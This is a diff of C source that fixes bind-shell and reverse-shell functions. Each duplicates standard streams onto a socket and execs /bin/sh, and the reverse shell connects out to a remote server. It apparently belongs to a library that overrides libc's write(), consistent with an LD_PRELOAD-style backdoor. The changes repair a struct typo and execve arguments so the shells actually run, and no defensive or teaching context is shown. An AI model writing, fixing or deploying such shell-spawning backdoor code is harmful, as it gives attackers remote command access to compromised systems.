@@ -33,8 +33,8 @@ int TCP_IP_BIND_SHELL(void){
     for(int i = 0; i < 3; i++){
         dup2(accepted_socket, i);
     }
-    
-    execve("/bin/sh", NULL, NULL);
+    char *args[] = {"/bin/sh", NULL};
+    execve("/bin/sh", args, NULL);
     close(listening_socket);
 }
 
@@ -57,13 +57,13 @@ int TCP_IP_REVERSE_SHELL(void){
 
     bind(listening_socket, (struct sockaddr *)&client_addr, sizeof(client_addr));
 
-    connect(listening_socket, (struct sockadder*)&server_addr, sizeof(server_addr));
+    connect(listening_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
     
     for(int i = 0; i < 3; i++){
         dup2(listening_socket, i);
     }
-
-    execve("/bin/sh", NULL, NULL);
+    char *args[] = {"/bin/sh", NULL};
+    execve("/bin/sh", args, NULL);
     close(listening_socket);
 }
 ssize_t write(int fildes, const void *buf, size_t nbytes)
